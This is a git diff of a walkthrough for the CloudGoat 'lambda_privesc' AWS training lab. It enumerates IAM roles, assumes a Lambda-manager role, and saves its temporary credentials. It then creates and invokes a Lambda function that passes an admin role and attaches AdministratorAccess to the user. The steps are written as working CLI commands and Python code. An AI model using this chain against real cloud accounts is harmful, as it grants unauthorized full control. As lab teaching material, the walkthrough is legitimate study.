@@ -71,72 +71,113 @@ To assume a role in AWS means to temporarily take on the access permissions asso
                     }
                 ]
 ```
-### 5. Assuming a New Role 
 
+There is also a cg-debug role that is able to be assumed by Lambda. If we can assume the Lambda role first, we should be able to then pursue this role. 
+```json
+{
+            "Path": "/",
+            "RoleName": "cg-debug-role-lambda_privesc_cgidydajq393qx",
+            "RoleId": "AROA2HVQ5NJF4DHIBD2DI",
+            "Arn": "arn:aws:iam::703671921227:role/cg-debug-role-lambda_privesc_cgidydajq393qx",
+            "CreateDate": "2025-03-13T15:27:21Z",
+            "AssumeRolePolicyDocument": {
+                "Version": "2012-10-17",
+                "Statement": [
+                    {
+                        "Effect": "Allow",
+                        "Principal": {
+                            "Service": "lambda.amazonaws.com"
+                        },
+                        "Action": "sts:AssumeRole"
+                    }
+                ]
+``` 
+### 5. Checking Role Permissions 
+Our current user has access to IAM Resources, so let's see what permissions these two roles have. 
+
+#### cg-lambdaManager
+We can check the permissions for this role with the following two commands. The first command will provide us with the ARN of the policy. The command will list out the actual permissions attached to the policy ARN. 
+```bash
+# Getting the Policy ARN
+aws iam list-attached-role-policies --role-name cg-lambdaManager-role-lambda_privesc_[CloudGoat-ID] --profile chris
+
+# Listing the actual permissions of the policy
+aws iam get-policy-version --policy-arn [Policy ARN] --version-id v1 --profile chris
+```
+This policy grants unrestricted access to all AWS Lambda operations, meaning the entity can create, modify, delete, and invoke Lambda functions. It also allows the entity to pass any IAM role to Lambda, potentially escalating privileges by attaching a role with higher permissions to a Lambda function.
+
+#### cg-debug
+Let's run the same commands against the cg-debug role to check permissions. 
+```bash
+# Getting the Policy ARN
+aws iam list-attached-role-policies --role-name cg-debug-role-lambda_privesc_[CloudGoat-ID] --profile chris
+```
+We don't even have to run the second command since the attached policy is `AdministratorAccess`. If we can compromise this role, we can compromise the full account. 
+
+### 6. Assuming the cg-LambdaManager Role 
+When we assume a role, it will generate temporary credentials for us. These credentials will provide us with the same permissions as the role. Let's do that now: 
 
 ```bash
-aws sts get-caller-identity
-
-aws configure --profile Chris
-
-aws iam list-user-policies --user-name chris-<cloudgoat_id> --profile Chris
-
-aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris
-
-aws iam get-policy-version --policy-arn <cg-chris-policy arn> --version-id v1 --profile Chris
+aws sts assume-role --role-arn [LambdaManager Role ARN] --role-session-name lambdaManager --profile chris
 ```
+This will provide you with the following:
+- Access Key ID
+- Secret Access Key
+- Session Token
 
-Our user has permissions to view IAM resources as well as assuming roles.
-
+#### Adding Credentials to ~/.aws/credentials 
+To use this role, we need to add the information to our ~/.aws/credentials file. You can open this with nano or your favorite text editor, and add it in this format: 
 ```bash
-aws iam list-roles --profile Chris
-
-aws iam list-attached-role-policies --role-name cg-debug-role-<cloudgoat_id> --profile Chris
-
-aws iam list-attached-role-policies --role-name cg-lambdaManager-role-<cloudgoat_id> --profile Chris
-
-aws iam get-policy-version --policy-arn <cg-lambdaManager-policy arn> --version-id v1 --profile Chris
-```
-
-The role grants permissions manage Lambda functions & pass roles that they can use. Assuming the role grants us its permissions.
-
-```bash
-aws sts assume-role --role-arn <cg-lambdaManager-role arn> --role-session-name lambdaManager --profile Chris
-```
-
-Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials` as shown below:
-
-```
 [lambdaManager]
-aws_access_key_id = {{AccessKeyId}}
-aws_secret_access_key = {{SecretAccessKey}}
-aws_session_token = {{SessionToken}}
+aws_access_key_id = ASIA.....
+aws_secret_access_key = 5sJu.......
+aws_session_token = FwoGZ.....
 ```
+Finally, let's confirm we have access to this role: 
+```bash
+aws sts get-caller-identity --profile lambdaManager
+```
+As long as everything worked, you should be provided with the UserID, Account, and ARN of this new role. 
 
-**Note**: The name of the file needs to be `lambda_function.py`.
+### 7. Creating a Lambda Function for Privilege Escalation 
+Since we have the ability to create Lambda functions, and the Lambda functions are able to assume AdministratorAccess, we can create a LambdaFunction that assigns administrative access to our user. 
 
-````py
+#### Creating the Lambda Function
+To create the lambda function, you need to create a file called `lambda_function.py` with the code below. By default, AWS Lambda’s Python runtime expects the handler in a file named lambda_function.py with a handler function called lambda_handler. 
+```python
 import boto3
 
 def lambda_handler(event, context):
-	client = boto3.client('iam')
+    iam = boto3.client('iam')
+    # Adjust the username and policy ARN as needed
+    iam.attach_user_policy(
+        UserName='chris-lambda_privesc_[Cloudgoat ID]',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+    return "Policy attached!"
+```
+This code defines a Lambda function that uses the AWS SDK for Python (boto3) to attach a specific AWS-managed policy (AdministratorAccess) to the IAM user named chris-lambda_privesc_cgidydajq393qx. In other words, once this function runs, the specified IAM user will have full administrative privileges in the AWS account.
 
-	response = client.attach_user_policy(
-		UserName = 'chris-<cloudgoat_id>',
-		PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
-	)
+### 8. Creating and Invoking the Function 
+Finally, let's create and then invoke the function for privilege escalation! 
 
-	return response
-````
-
-Create the function and invoke it to grant our user admin permissions.
-
+#### Creating the Function 
+To create the function, we first need to add it to a zip file. 
 ```bash
 zip -r lambda_function.py.zip lambda_function.py
+```
+Let's actually create the function now with the AWS CLI (p.s. - you don't need to memorize syntax. ChatGPT and Google will come in handy for these kinds of things!) 
+```bash
+aws lambda create-function --function-name admin_function --runtime python3.9 --role [cg-debug-role arn] --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager --region us-east-1
+```
+#### Invoking the Function
+Finally, let's invoke the function. This should provide our "chris" user with administative privileges 
+```bash
+aws lambda invoke --function-name admin_function out.txt --profile lambdaManager --region us-east-1
+```
 
-aws lambda create-function --function-name admin_function --runtime python3.9 --role <cg-debug-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager
-
-aws lambda invoke --function-name admin_function out.txt --profile lambdaManager
-
+### 9. Confirming Privilege Escalation 
+Let's check the permissions on our user. If all worked, we should have the AdministratorAccess policy applied! 
+```bash
 aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris
 ```
